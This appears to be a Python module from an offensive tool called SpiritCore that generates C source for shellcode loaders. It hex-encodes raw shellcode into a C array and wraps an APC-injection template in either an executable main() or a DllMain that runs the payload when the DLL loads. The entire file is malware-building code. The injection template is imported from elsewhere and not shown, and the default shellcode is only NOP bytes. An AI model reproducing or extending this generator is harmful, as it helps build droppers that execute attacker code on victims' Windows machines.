
from SpiritCore.Lib.Payload.Code import *
from SpiritCore.System import print_msg, print_success
EXE_Entry ="""

int main(int argc,char argv[]) {
	
	run();
	return 0;
}
"""
DLL_Entry="""

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            run();
            break;

        case DLL_PROCESS_DETACH:
            
            break;

        case DLL_THREAD_ATTACH:
           
            break;

        case DLL_THREAD_DETACH:
            
            break;
    }
    return TRUE;
}
"""

def shellcodecpphex(data):
    shellcode = ''
    try:
        for code in data:
            code_hex = hex(code)
            code_hex = code_hex.replace('0x', '')
            if (len(code_hex) == 1):
                code_hex = '0' + code_hex
            shellcode += r'\x' + code_hex
    except Exception as e:
        print(e)
    shellcodes = "char shellcode[] = \"" + shellcode + "\";"
    return shellcodes






class RunShellCodePayload:
    Code=""
    PayloadType="ApcInject"
    CShellCode=""
    CEncode=""
    Encode="None"
    RunType="exe"
    ShellCode=b"\x90\x90"
    def __init__(self,Object):
        self.Object=Object
    def init(self):
        if self.Encode=="None":
            self.CShellCode=shellcodecpphex(self.ShellCode)
            self.CEncode=""
        if self.PayloadType=="ApcInject":
            self.Code=ApcInject
    def Generate(self):
        #print(self.RunType)
        if self.RunType=="exe":
            Enrty=EXE_Entry
        elif self.RunType=="dll":
            Enrty=DLL_Entry
        Ret= self.Code%(self.CShellCode,self.CEncode,Enrty)
        print_success("Generate ShellCode and C Sources Successfully")
        return Ret
        